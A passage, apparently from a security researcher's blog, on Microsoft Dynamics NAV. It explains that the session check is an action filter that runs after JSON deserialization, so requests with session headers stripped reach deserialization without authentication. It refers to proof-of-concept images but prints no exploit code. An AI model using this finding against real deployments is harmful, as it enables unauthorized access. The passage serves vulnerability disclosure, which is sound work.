[ClientOperationBehavior(SessionUsage.UseCurrentSession, RunInTransaction = true, RetryAfterTransientError = true, TelemetryCategory = Category.Metadata)]
[Route("metadata")]
public class ClientMetadataController : ServiceOperationController, IClientMetadataApi
// [...snip...]
```

A lot of evil sounding attributes which will make an exploiter's life a lot more difficult. But did you really look into all the details of my PoC GIF above? Any session headers visible?

If you look back to the `SessionIdAttribute` code above, you see that this class inherits from `Microsoft.AspNetCore.Mvc.Filters.ActionFilterAttribute`. What is this attribute about? Reading a bit of [Microsoft documentation](https://learn.microsoft.com/en-us/aspnet/mvc/overview/older-versions-1/controllers-and-routing/understanding-action-filters-cs#the-base-actionfilterattribute-class) tells us a few things.

> In order to make it easier for you to implement a custom action filter, the ASP.NET MVC framework includes a base ActionFilterAttribute class. This class implements both the IActionFilter and IResultFilter interfaces and inherits from the Filter class.  
The base ActionFilterAttribute class has the following methods that you can override:  
* OnActionExecuting – This method is called before a controller action is executed.
* OnActionExecuted – This method is called after a controller action is executed.
* OnResultExecuting – This method is called before a controller action result is executed.
* OnResultExecuted – This method is called after a controller action result is executed.

The `SessionIdAttribute` implements two overriding methods `System.Void Microsoft.Dynamics.Nav.Service.AspNetCore.Filters.SessionIdAttribute::OnActionExecuting(Microsoft.AspNetCore.Mvc.Filters.ActionExecutingContext)` (the one we looked at already!) and `System.Void Microsoft.Dynamics.Nav.Service.AspNetCore.Filters.SessionIdAttribute::OnActionExecuted(Microsoft.AspNetCore.Mvc.Filters.ActionExecutedContext)`. So I thought maybe, just maybe, `OnActionExecuting` might already be too late because deserializing the `views` method parameter object had to take place before. Microsoft's Action Filter documentation
also explains that there are different types of filters often used.

> * Authorization filters – Implements the `IAuthorizationFilter` attribute.
* Action filters – Implements the `IActionFilter` attribute.
* Result filters – Implements the `IResultFilter` attribute.
* Exception filters – Implements the `IExceptionFilter` attribute.  
Filters are executed in the order listed above. For example, authorization filters are always executed before action filters and exception filters are always executed after every other type of filter.

Would an `IAuthorizationFilter` have protected better here?

But let's investigate our `IAuthorizationFilter` scenario with a few more breakpoints. We take one of our former Json requests (doesn't really matter) from Wireshark, i.e. with all session headers etc., delete them and fire the request.


{:refdef: style="text-align: center;"}
![Filter Attribute Order Issue](/assets/images/dynamics/filterattributeorder.gif)
{: refdef}

This is it! No authenication needed to reach the Json deserialization procedures.

# The End

{:refdef: style="text-align: center;"}
![Create Directory PoC](/assets/images/dynamics/thefin.png)
{: refdef}



